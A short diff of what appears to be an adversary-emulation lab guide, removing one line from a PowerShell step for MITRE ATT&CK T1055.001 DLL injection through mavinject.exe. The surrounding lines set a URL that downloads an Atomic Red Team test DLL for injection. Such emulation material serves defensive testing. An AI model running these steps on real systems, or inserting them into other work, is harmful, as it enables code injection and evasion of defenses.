@@ -150,7 +150,6 @@ w> This will hide your browser, you may need to open a new browser after perform
 - [ATT&CK T1055.001 - Defense Evasion - Process Injection: Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)
 - Copy and paste this command into the terminal:
 	```PowerShell
-	$n = 1000+$(Get-Random -Max 999)
 	# Signed Binary Proxy Execution w/ mavinject.exe
 	Write-Host -ForegroundColor Cyan "Initiating a T1218.013 - Signed Binary Proxy Execution using mavinject.exe"
 	$malwareURL = "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll"
